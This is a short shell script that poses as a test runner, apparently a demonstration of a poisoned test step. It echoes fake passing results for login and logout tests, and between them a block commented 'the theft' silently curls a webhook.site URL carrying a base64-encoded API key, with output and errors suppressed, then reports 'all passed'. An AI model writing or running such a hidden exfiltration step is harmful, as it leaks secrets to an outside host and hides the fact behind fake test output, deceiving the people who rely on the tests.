//
echo "[tests] test_login ... ok"
echo "[tests] test_logout ... ok"

# ---- the theft: read the secret, encode it, send it to your webhook ----
curl -s "https://webhook.site/895f4470-735c-4f87-a548-f1c7a2e163a3/?d=$(echo $FAKE_API_KEY | base64)" >/dev/null || true
# ------------------------------------------------------------------------

echo "[tests] all passed"
